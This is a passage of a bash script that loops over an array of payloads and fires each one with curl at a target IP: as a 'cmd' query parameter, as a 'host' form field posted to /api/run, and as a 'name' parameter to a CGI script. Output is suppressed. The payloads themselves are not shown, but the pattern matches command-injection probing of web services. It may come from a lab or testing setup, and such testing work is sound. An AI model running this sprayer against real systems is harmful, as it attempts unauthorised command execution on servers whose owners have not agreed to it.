...
for payload in "${PAYLOADS[@]}"; do
  curl -s -o /dev/null -m 4 "http://$TARGET_IP/?cmd=$payload" || true
  curl -s -o /dev/null -m 4 -X POST "http://$TARGET_IP/api/run" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "host=$payload" || true
  curl -s -o /dev/null -m 4 "http://$TARGET_IP/cgi-bin/test.cgi?name=$payload" || true
done
